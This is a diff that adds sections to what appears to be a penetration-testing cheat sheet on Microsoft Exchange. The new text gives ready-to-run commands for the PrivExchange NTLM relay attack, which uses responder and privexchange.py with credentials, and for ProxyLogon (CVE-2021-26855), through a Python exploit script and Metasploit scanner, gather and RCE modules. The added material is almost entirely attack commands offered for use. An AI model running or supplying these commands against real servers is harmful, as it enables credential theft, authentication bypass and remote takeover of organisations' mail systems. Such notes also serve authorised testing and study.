@@ -915,7 +915,28 @@ curl -k --ntlm -u '$domain\$user:$password' https://$domain/OAB/$OABUrl/$OABId-d
 
 ### PrivExchange
 
+**[PrivExchange](https://github.com/dirkjanm/PrivExchange) use PushSubscription Feature, a user is able to capture the NTLM authentication data of an Exchange server With a simple call to the "PushSubscription" API**
+
+```bash
+responder -I eth0 -Av
+python3 privexchange.py -d $domain -u $user -p $password -ah -ap '/test/test/test' mx.server.com --debug
+```
+
+
 ### ProxyLogon
+
+**[ProxyLogon](https://github.com/hausec/ProxyLogon) is the name given to CVE-2021-26855 that allows an attacker to bypass authentication and impersonate users on MS Exchange servers**
+```bash
+python proxylogon.py $ip user@fqdn
+```
+
+> using metasploit:
+```bash
+use auxiliary/scanner/http/exchange_proxylogon
+use auxiliary/gather/exchange_proxylogon
+use exploit/windows/http/exchange_proxylogon_rce
+```
+
 
 ### CVE-2020-0688
 
